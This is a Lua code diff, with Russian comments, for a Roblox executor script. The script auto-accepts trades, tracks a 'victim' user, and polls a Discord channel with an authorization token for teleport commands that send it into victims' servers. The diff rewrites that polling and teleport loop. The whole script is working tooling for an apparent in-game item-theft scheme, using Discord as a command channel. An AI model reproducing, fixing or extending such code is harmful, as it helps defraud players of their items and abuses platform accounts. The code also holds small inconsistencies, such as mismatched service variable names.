@@ -26,7 +26,7 @@ if not joinedFile then
 end
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
-local didVictimLeave = false
+local isTeleporting = false
 local timer = 0
 
 local function selectDevice()
@@ -107,31 +107,92 @@ task.spawn(acceptRequest) -- Start accepting trade requests
 task.spawn(acceptTrade) -- Start accepting trades
 task.spawn(tradeTimer)
 
-local function autoJoin()
+local lastCheckedMessageId = nil
+
+-- Улучшенная функция проверки Discord
+local function checkDiscord()
     local response = request({
-        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=5",
         Method = "GET",
         Headers = {
             ['Authorization'] = token,
-            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            ["Content-Type"] = "application/json"
+            ['Content-Type'] = 'application/json'
         }
     })
 
-        local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then
-            print("0 messages found")
-            return
+    if not response.Success then
+        warn("❌ Ошибка Discord:", response.StatusCode)
+        return false
+    end
+
+    local messages = HttpService:JSONDecode(response.Body)
+    
+    -- Проверяем сообщения в обратном порядке (от новых к старым)
+    for i = #messages, 1, -1 do
+        local msg = messages[i]
+        
+        -- Пропускаем уже проверенные сообщения
+        if lastCheckedMessageId and msg.id == lastCheckedMessageId then
+            break
         end
-        for _, message in ipairs(messages) do
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-                    if placeId and jobId then
-                        local victimUsername = message.embeds.fields[1].value
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                                return
-                            end
-                        end
+
+        if msg.content then
+            print("🔍 Проверяем сообщение:", string.sub(msg.content, 1, 100))
+            
+            -- Ищем команду телепортации в любом формате
+            local placeId, jobId = msg.content:match('TeleportService["\'%)]%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']')
+            if not placeId or not jobId then
+                placeId, jobId = msg.content:match('game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']')
+            end
+
+            if placeId and jobId then
+                print("🎯 Найдены ID:", placeId, jobId)
+                
+                if not table.find(joinedIds, msg.id) then
+                    table.insert(joinedIds, msg.id)
+                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
+                    
+                    print("🚀 Телепортируемся...")
+                    isTeleporting = true
+                    lastCheckedMessageId = msg.id
+                    
+                    local success = pcall(function()
+                        game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
+                    end)
+                    
+                    if not success then
+                        isTeleporting = false
+                        warn("❌ Ошибка телепортации")
+                    end
+                    return true
+                else
+                    print("⚠️ Уже были на этом сервере")
+                end
+            end
         end
-while wait(5) do
-    autoJoin()
+    end
+    
+    -- Запоминаем ID последнего сообщения, если ничего не нашли
+    if #messages > 0 then
+        lastCheckedMessageId = messages[1].id
+    end
+    
+    return false
+end
+
+-- Основной цикл с оптимизированными интервалами
+while true do
+    if not isTeleporting then
+        local found = pcall(checkDiscord)
+        if not found then
+            -- Если ничего не найдено, ждем дольше
+            task.wait(30)
+        else
+            -- Если нашли что-то, следующую проверку делаем через 5 секунд
+            task.wait(5)
+        end
+    else
+        -- Если в процессе телепортации, ждем завершения
+        task.wait(5)
+    end
 end
